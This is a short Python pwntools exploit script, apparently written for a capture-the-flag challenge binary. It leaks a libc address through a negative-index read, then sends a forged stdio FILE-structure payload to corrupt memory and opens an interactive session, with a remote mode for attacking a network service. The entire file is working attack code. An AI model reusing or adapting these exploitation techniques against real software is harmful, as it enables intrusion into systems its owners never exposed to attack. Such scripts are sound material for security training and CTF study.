#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+728
'''.format(**locals())
# break *main+626
# break *main+658

# =========================================================
#                         EXPLOITS
# =========================================================
# _IO_file_jumps 0000000000216600
# system 0000000000050d60
# _IO_2_1_stdout_ 000000000021a780

io = initialize()

# leak libc
io.sendlineafter(b':', b'-3')
io.recvuntil(b'Username : ')
libc.address = int(io.recvline().strip(), 16) - libc.sym['_IO_2_1_stdout_']

# ?
payload = flat([
    libc.sym['_IO_2_1_stdin_'] - 1,
    libc.sym['_IO_2_1_stdout_'],
    libc.sym['_IO_2_1_stdout_'],
    libc.sym['_IO_2_1_stdout_'],
    p64(1) * 8,
    libc.sym['_IO_2_1_stdin_']
])

io.sendlineafter(b':', b'-6')
io.sendlineafter(b':', payload)

info('libc addr: %#x', libc.address)

io.interactive()